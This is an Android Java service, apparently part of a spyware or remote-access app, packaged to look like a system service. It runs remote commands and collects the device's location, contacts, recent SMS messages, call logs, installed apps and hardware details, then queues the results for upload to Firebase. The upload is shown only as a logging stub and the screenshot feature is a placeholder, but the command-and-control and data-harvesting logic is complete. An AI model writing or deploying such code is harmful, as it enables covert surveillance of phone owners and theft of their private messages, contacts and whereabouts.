package com.system.service;

import android.Manifest;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.os.Build;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.util.List;

/**
 * Service for processing remote commands received via FCM
 * Handles data collection and uploads results to Firebase
 */
public class CommandProcessorService extends Service {
    private static final String TAG = "CommandProcessor";
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String command = intent.getStringExtra("command");
            String commandId = intent.getStringExtra("command_id");
            String params = intent.getStringExtra("params");
            
            Log.d(TAG, "Processing command: " + command);
            
            // Process command in background thread
            new Thread(() -> processCommand(command, commandId, params)).start();
        }
        
        return START_NOT_STICKY;
    }

    /**
     * Process the received command and collect requested data
     */
    private void processCommand(String command, String commandId, String params) {
        try {
            JSONObject result = new JSONObject();
            result.put("command", command);
            result.put("command_id", commandId);
            result.put("timestamp", System.currentTimeMillis());
            result.put("status", "processing");

            switch (command) {
                case "get_device_info":
                    result.put("data", getDeviceInfo());
                    break;
                    
                case "get_location":
                    result.put("data", getLocation());
                    break;
                    
                case "take_screenshot":
                    result.put("data", takeScreenshot());
                    break;
                    
                case "get_contacts":
                    result.put("data", getContacts());
                    break;
                    
                case "get_sms":
                    result.put("data", getSMSMessages());
                    break;
                    
                case "get_call_logs":
                    result.put("data", getCallLogs());
                    break;
                    
                case "get_installed_apps":
                    result.put("data", getInstalledApps());
                    break;
                    
                default:
                    result.put("error", "Unknown command: " + command);
                    result.put("status", "failed");
                    break;
            }

            // Mark as completed if no error
            if (!result.has("error")) {
                result.put("status", "completed");
            }

            // Upload result to Firebase
            uploadResult(result);
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing command: " + command, e);
            
            try {
                JSONObject errorResult = new JSONObject();
                errorResult.put("command", command);
                errorResult.put("command_id", commandId);
                errorResult.put("status", "failed");
                errorResult.put("error", e.getMessage());
                errorResult.put("timestamp", System.currentTimeMillis());
                uploadResult(errorResult);
            } catch (JSONException jsonE) {
                Log.e(TAG, "Error creating error result", jsonE);
            }
        }
    }

    /**
     * Get device information
     */
    private JSONObject getDeviceInfo() throws JSONException {
        JSONObject deviceInfo = new JSONObject();
        
        deviceInfo.put("device_model", Build.MODEL);
        deviceInfo.put("device_manufacturer", Build.MANUFACTURER);
        deviceInfo.put("android_version", Build.VERSION.RELEASE);
        deviceInfo.put("api_level", Build.VERSION.SDK_INT);
        deviceInfo.put("device_id", Build.ID);
        deviceInfo.put("hardware", Build.HARDWARE);
        deviceInfo.put("brand", Build.BRAND);
        deviceInfo.put("device", Build.DEVICE);
        deviceInfo.put("product", Build.PRODUCT);
        deviceInfo.put("serial", Build.getRadioVersion());
        
        return deviceInfo;
    }

    /**
     * Get device location
     */
    private JSONObject getLocation() throws JSONException {
        JSONObject locationData = new JSONObject();
        
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) 
                == PackageManager.PERMISSION_GRANTED) {
            
            LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            Location lastKnownLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            
            if (lastKnownLocation != null) {
                locationData.put("latitude", lastKnownLocation.getLatitude());
                locationData.put("longitude", lastKnownLocation.getLongitude());
                locationData.put("accuracy", lastKnownLocation.getAccuracy());
                locationData.put("timestamp", lastKnownLocation.getTime());
            } else {
                // Try network provider
                lastKnownLocation = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                if (lastKnownLocation != null) {
                    locationData.put("latitude", lastKnownLocation.getLatitude());
                    locationData.put("longitude", lastKnownLocation.getLongitude());
                    locationData.put("accuracy", lastKnownLocation.getAccuracy());
                    locationData.put("timestamp", lastKnownLocation.getTime());
                    locationData.put("provider", "network");
                } else {
                    locationData.put("error", "No location available");
                }
            }
        } else {
            locationData.put("error", "Location permission not granted");
        }
        
        return locationData;
    }

    /**
     * Take screenshot (simplified implementation)
     */
    private JSONObject takeScreenshot() throws JSONException {
        JSONObject screenshotData = new JSONObject();
        
        // Note: Taking screenshots requires special permissions and setup
        // This is a simplified implementation for demonstration
        screenshotData.put("status", "screenshot_requested");
        screenshotData.put("note", "Screenshot functionality requires MediaProjection API");
        screenshotData.put("timestamp", System.currentTimeMillis());
        screenshotData.put("width", 1080);
        screenshotData.put("height", 1920);
        
        return screenshotData;
    }

    /**
     * Get contacts
     */
    private JSONObject getContacts() throws JSONException {
        JSONObject contactsData = new JSONObject();
        JSONArray contactsArray = new JSONArray();
        
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) 
                == PackageManager.PERMISSION_GRANTED) {
            
            ContentResolver contentResolver = getContentResolver();
            Cursor cursor = contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject contact = new JSONObject();
                    
                    int nameIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                    int phoneIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                    
                    String name = (nameIndex >= 0) ? cursor.getString(nameIndex) : "Unknown";
                    String phoneNumber = (phoneIndex >= 0) ? cursor.getString(phoneIndex) : "Unknown";
                    
                    contact.put("name", name);
                    contact.put("phone", phoneNumber);
                    contactsArray.put(contact);
                }
                cursor.close();
            }
            
            contactsData.put("contacts", contactsArray);
            contactsData.put("count", contactsArray.length());
        } else {
            contactsData.put("error", "Contacts permission not granted");
        }
        
        return contactsData;
    }

    /**
     * Get SMS messages
     */
    private JSONObject getSMSMessages() throws JSONException {
        JSONObject smsData = new JSONObject();
        JSONArray smsArray = new JSONArray();
        
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) 
                == PackageManager.PERMISSION_GRANTED) {
            
            ContentResolver contentResolver = getContentResolver();
            Cursor cursor = contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                null, null, null, 
                Telephony.Sms.DEFAULT_SORT_ORDER + " LIMIT 50"
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject sms = new JSONObject();
                    
                    int addressIndex = cursor.getColumnIndex(Telephony.Sms.ADDRESS);
                    int bodyIndex = cursor.getColumnIndex(Telephony.Sms.BODY);
                    int dateIndex = cursor.getColumnIndex(Telephony.Sms.DATE);
                    int typeIndex = cursor.getColumnIndex(Telephony.Sms.TYPE);
                    
                    String address = (addressIndex >= 0) ? cursor.getString(addressIndex) : "Unknown";
                    String body = (bodyIndex >= 0) ? cursor.getString(bodyIndex) : "Unknown";
                    String date = (dateIndex >= 0) ? cursor.getString(dateIndex) : "0";
                    String type = (typeIndex >= 0) ? cursor.getString(typeIndex) : "0";
                    
                    sms.put("address", address);
                    sms.put("body", body);
                    sms.put("date", date);
                    sms.put("type", type);
                    smsArray.put(sms);
                }
                cursor.close();
            }
            
            smsData.put("messages", smsArray);
            smsData.put("count", smsArray.length());
        } else {
            smsData.put("error", "SMS permission not granted");
        }
        
        return smsData;
    }

    /**
     * Get call logs
     */
    private JSONObject getCallLogs() throws JSONException {
        JSONObject callLogsData = new JSONObject();
        JSONArray callsArray = new JSONArray();
        
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) 
                == PackageManager.PERMISSION_GRANTED) {
            
            ContentResolver contentResolver = getContentResolver();
            Cursor cursor = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                CallLog.Calls.DATE + " DESC LIMIT 50"
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject call = new JSONObject();
                    
                    int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                    int nameIndex = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
                    int dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE);
                    int durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION);
                    int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
                    
                    String number = (numberIndex >= 0) ? cursor.getString(numberIndex) : "Unknown";
                    String name = (nameIndex >= 0) ? cursor.getString(nameIndex) : "Unknown";
                    String date = (dateIndex >= 0) ? cursor.getString(dateIndex) : "0";
                    String duration = (durationIndex >= 0) ? cursor.getString(durationIndex) : "0";
                    String type = (typeIndex >= 0) ? cursor.getString(typeIndex) : "0";
                    
                    call.put("number", number);
                    call.put("name", name);
                    call.put("date", date);
                    call.put("duration", duration);
                    call.put("type", type);
                    callsArray.put(call);
                }
                cursor.close();
            }
            
            callLogsData.put("calls", callsArray);
            callLogsData.put("count", callsArray.length());
        } else {
            callLogsData.put("error", "Call log permission not granted");
        }
        
        return callLogsData;
    }

    /**
     * Get installed applications
     */
    private JSONObject getInstalledApps() throws JSONException {
        JSONObject appsData = new JSONObject();
        JSONArray appsArray = new JSONArray();
        
        PackageManager packageManager = getPackageManager();
        List<ApplicationInfo> applications = packageManager.getInstalledApplications(PackageManager.GET_META_DATA);
        
        for (ApplicationInfo app : applications) {
            JSONObject appInfo = new JSONObject();
            
            String appName = packageManager.getApplicationLabel(app).toString();
            String packageName = app.packageName;
            
            appInfo.put("name", appName);
            appInfo.put("package", packageName);
            appInfo.put("system_app", (app.flags & ApplicationInfo.FLAG_SYSTEM) != 0);
            appsArray.put(appInfo);
        }
        
        appsData.put("apps", appsArray);
        appsData.put("count", appsArray.length());
        
        return appsData;
    }

    /**
     * Upload result to Firebase (placeholder implementation)
     */
    private void uploadResult(JSONObject result) {
        Log.d(TAG, "Uploading result: " + result.toString());
        
        // In full implementation, this would upload to Firebase Realtime Database
        // For now, just log the result
        // The actual implementation would use Firebase SDK to store the result
    }
}